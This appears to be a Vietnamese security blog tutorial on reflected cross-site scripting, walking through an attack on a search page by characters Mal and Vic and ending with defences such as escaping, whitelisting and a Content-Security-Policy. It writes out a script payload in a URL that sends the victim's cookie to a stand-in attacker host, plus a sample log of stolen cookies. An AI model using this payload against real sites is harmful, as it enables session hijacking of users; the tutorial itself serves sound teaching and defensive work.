# Tổng quan
Hello, khi xây dựng một website, bạn cần chắc chắn rằng không cho phép mã độc `Javascript` được trả ra. [Lần trước](https://viblo.asia/p/cross-site-scripting-Ljy5VpqMZra) mình đã có viết về Khác với `Stored-XSS`, `Reflected-XSS` đoạn mã khai thác sẽ không được lưu trữ trên server. `Stored-XSS` cho phép kẻ tấn công lưu trữ mã độc `JS` trên database của server, nó đồng nghĩa với việc những người dùng khác cũng bị ảnh hưởng khi truy cập vào trang có chứa mã độc.

Trong bài viết này, chúng ta sẽ tìm hiểu một cách tấn công nữa mà trong đó kẻ tấn công có thể sử dụng `XSS` để truyền mã độc `JS`, cách tấn công đó được gọi là `Reflected XSS`.

Nếu như website của bạn nhận request HTTP từ người dùng và hiển thị lại cho họ, như vậy là bạn đã kích hoạt một vectơ khác từ bên thứ ba có thể tiêm JavaScript độc hại. Cùng xem nó hoạt động thế nào nhé.

# Cách thức hoạt động
Nhân vật quen thuộc trong các bài viết của mình đó là **Mal**, đực rựa này tìm ra chức năng search trên trang web của bạn có vấn đề và hắn sẽ chén nó.

Hắn biết rằng từ khóa tìm kiếm trên URL sẽ được hiện thị trên trang kết quả tìm kiếm, và hắn cũng tự hỏi liệu nó đã `escaped` ?

![](https://images.viblo.asia/b5a97073-86d1-41fa-8724-3a83adca8edb.png)

Để kiểm, hắn sửa url với đoạn `snippet` `JS` trên search param: `www.welp.com?search=<script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>`.

Khi hắn drops đường dẫn trên trình duyệt, đoạn `JS` được inject sẽ thực thi và chuyển hướng tới `haxxed.com?cookie=asFFEfn222fefeknladf` (site độc) ... yep, poor u :))

Bây giờ hắn tiến hành lừa ai đó, như **Vic** tội nghiệp - nhân vật bất hạnh trong [series](https://viblo.asia/s/to-da-hoc-bao-mat-co-ban-nhu-the-nao-68Z00JY2ZkG) này chẳng hạn :))

**Mal** gửi cho **Vic** email với đường dẫn đầy cám dỗ, và được trỏ tới đường dẫn đã được chỉnh sửa

![](https://images.viblo.asia/0d887f6a-c08a-479a-b367-62e640fb1851.png)

**Vic** click vào link, page render ra search parameter trong html mà không được `escape` đúng cách, nó sẽ tạo mới thẻ `<script>`
```html:webpage html
<div class="search-terms">
  Search results for "<script>
    window.location="http://www.haxxed.com?cookie="+document.cookie
  </script>"
</div>

<h6>No results found</h6>
```
Đoạn `script` được thực thi khi trang web được load, và không có **taco** nào cả :)) bạn được điều hướng tới một trang web độc kèm theo cookie. **Mal** sẽ kiểm tra server log và `hijack` `session` của  **Vic**
```:log
http://www.haxxed.com?cookie=asdfefefffasdfCsdfnE
http://www.haxxed.com?cookie=engkelfiAnlJreklfNkl
http://www.haxxed.com?cookie=SneklfjsdkleekflaAne
http://www.haxxed.com?cookie=asFFEfn222fefeknladf
```

# Rủi do
Đây là lỗi thường gặp, dễ khai thác, và nguy hiểm, nó không nguy hiểm bằng `stored XSS attacks` nhưng lại phổ biến hơn nhiều.

Lỗ hổng này rất dễ bị bỏ qua ở phần review lại  code, vì thường chúng ta sẽ kiểm tra chủ yếu phần data được lưu trữ. Bạn hãy đặc biệt cẩn thận trong việc kiểm tra các loại trang sau đây:
1. **kết quả tìm kiếm**
2. **Error pages**
3. **form submissions**

Ví dụ vừa rồi chúng ta đã thấy được lỗi xảy ra với phương thức `GET`, tuy nhiên `POST` request nên được kiểm tra cẩn thận. Kể cả khi bạn sử dụng CSRF thì kẻ tấn công vẫn có thể vượt qua bằng cách thức tấn công này.

# Bảo vệ
Hãy chắc cú rằng dynamic content trả ra không thể `inject` `Javascript`.

1. Escape dynamic content
2. Whitelist Values
3. Implement a Content-Security Policy

Với **Implement a Content-Security Policy** bạn có thể sử dụng thẻ `<meta>` trong `<head>` với nội dung sau:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self' https://apis.google.com">
```

# Tổng kết
Trên đây là phần giới thiệu cơ bản về `Reflected-XSS`, hy vọng sẽ giúp bạn tránh được lỗi bảo mật này. Cảm ơn đã đọc hết, happy coding ! <3